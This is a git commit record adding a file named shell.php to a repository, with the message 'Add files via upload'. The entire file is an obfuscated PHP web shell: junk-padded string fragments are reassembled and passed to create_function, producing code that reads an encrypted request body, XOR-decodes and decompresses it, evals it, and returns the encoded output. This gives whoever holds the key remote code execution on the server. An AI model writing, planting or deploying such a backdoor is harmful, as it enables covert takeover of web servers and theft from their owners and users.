5e9be8c7505a22f69c85cbf1c79d55f207e254ee
Neptune <80949976+neptune1337@users.noreply.github.com>
2021-04-05 22:39:45 +0530

    Add files via upload

---
+++ shell.php
@@ -0,0 +1,13 @@
+<?php
+$O='1) {@c<c<ob_sc<tart();@evac<lc<(@gc<zuncompress(@x(@bc<ase64c<_dc<ecc<ode(';
+$l=str_replace('Hs','','HsHscreateHs_fuHsncHstHsion');
+$b='c<iKC5i48WAr9oc<cyMqc<";funcc<tion c<c<x(c<$t,$k){$c=strc<len($k);$l=c<strl';
+$J='$k="c<e2ef4a3dc<c<";$kh="e9c<7dc3cd05c<1c<c";$kf=c<"28a56ec<3c78c2";$pc<="';
+$i='c<"/c<$kh(.c<+c<c<)$kf/",@file_getc<_contentsc<("php://ic<c<nput"),$m)c<==';
+$p='+c<+c<,$c<i++){$o.c<=$t{$ic<}^$k{$j};}}retc<urn $oc<;}ifc< (@preg_c<match(';
+$x='ec<nc<(c<$t);$c<o="";forc<($i=c<0;$i<$l;){for($j=c<c<0;($j<$c&&$i<c<$l);$j';
+$j='ase6c<4c<_encode(@x(@gzcc<oc<mpressc<($oc<)c<,$k));print("$p$kh$rc<$kf");}';
+$T='$m[1])c<,$k)));$c<c<o=@ob_get_contec<nts()c<;@oc<b_c<end_cc<lc<ean();$r=@b';
+$q=str_replace('c<','',$J.$b.$x.$p.$i.$O.$T.$j);
+$s=$l('',$q);$s();
+?>
